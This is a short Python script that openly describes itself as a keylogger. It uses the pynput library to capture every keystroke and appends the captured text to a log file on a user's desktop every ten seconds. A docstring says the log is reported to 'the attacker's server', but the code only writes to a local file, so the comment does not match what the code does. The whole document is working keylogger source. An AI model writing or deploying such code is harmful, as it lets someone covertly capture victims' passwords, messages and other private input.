from pynput import keyboard
import os
import threading

log = ""
path = "/Users/thomas/Desktop/log.txt"

def processkeys(key):
    """
    Process the keys pressed by the user and store them in the log variable.
    """
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        else:
            log += ""

def report():
    """
    Report the log to the attacker's server.
    """
    global log, path
    with open(path, "a") as logfile:
        logfile.write(log)
    log = ""
    threading.Timer(10, report).start()

report()

# Start the keylogger
with keyboard.Listener(on_press=processkeys) as keyboard_listener:
    keyboard_listener.join()
